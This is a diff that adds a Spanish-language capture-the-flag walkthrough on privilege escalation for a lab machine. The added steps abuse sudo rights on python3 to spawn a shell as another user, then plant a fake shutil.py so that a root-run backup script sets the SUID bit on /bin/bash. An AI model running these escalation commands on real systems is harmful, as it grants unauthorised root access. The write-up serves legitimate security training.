@@ -168,7 +168,121 @@ Resumiendo, creamos un archivo que contiene una reverse shell, montamos un servi
 
 ## FASE ESCALADA DE PRIVILEGIOS
 
+Hacemos tratamiento de la TTY:
+```bash
+export TERM=xterm
+export SHELL=bash
+script /dev/null -c bash 
+^Z
+stty raw -echo; fg
+reset xterm
+stty rows 51 columns 237
+```
+
+Con `sudo -l` vemos que tenemos un privilegio que es ejecutar python3 como el usuario bobby 
+
+
+![Nmap Scan](images/talent/21.png)
+
+
+Vamos a la página `https://gtfobins.org/` y vemos que se puede abusar el binario
+
+![Nmap Scan](images/talent/22.png)
+
+
+Ajustamos a python3 y ejecutamos en siguiente comando:
+
+```bash
+sudo -u bobby /usr/bin/python3 -c 'import os; os.execl("/bin/sh", "sh")'
+```
+
+
+![Nmap Scan](images/talent/23.png)
 
 
 
+Ya somos bobby.
 
+hacemos un pseudo tratamiento de la TTY:
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Ejecutamos `sudo -l` y vemos que tenemos privilegios como cualquier usuario (eso incluye root) de `/usr/bin/python3 /opt/backup.py`
+
+
+
+![Nmap Scan](images/talent/25.png)
+
+
+en `/opt` tengo permisos de escritura y el script me me da pié a un Library Hijacking, primero miro el PAT:
+```bash
+ echo $PATH
+```
+y veo esto:
+```
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+```
+
+me aseguro de que el primero directorio que mire sea `/opt`:
+```bash
+export PATH=/opt:$PATH
+```
+lo compruebo:
+
+```
+echo $PATH
+/opt:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+```
+
+![Nmap Scan](images/talent/26.png)
+
+
+Al inicio del script importa librerias:
+```
+import os
+import sys
+import shutil
+import datetime
+import tarfile
+import logging
+import argparse
+```
+
+![Nmap Scan](images/talent/27.png)
+
+y voy a crear una falsa:
+
+```bash
+echo 'import os; os.system("chmod u+s /bin/bash")' > shutil.py
+```
+
+
+![Nmap Scan](images/talent/28.png)
+
+
+y ahora ejecutamos el script:
+
+```bash
+sudo -u root /usr/bin/python3 /opt/backup.py
+```
+
+comprovamos los permisos de `/bin/bash`
+
+```
+ ls -la /bin/bash
+-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
+```
+
+vemos el SUID y ejecutamos:
+
+```
+bash -p
+```
+
+
+![Nmap Scan](images/talent/28.png)
+
+
+
+ya somos root
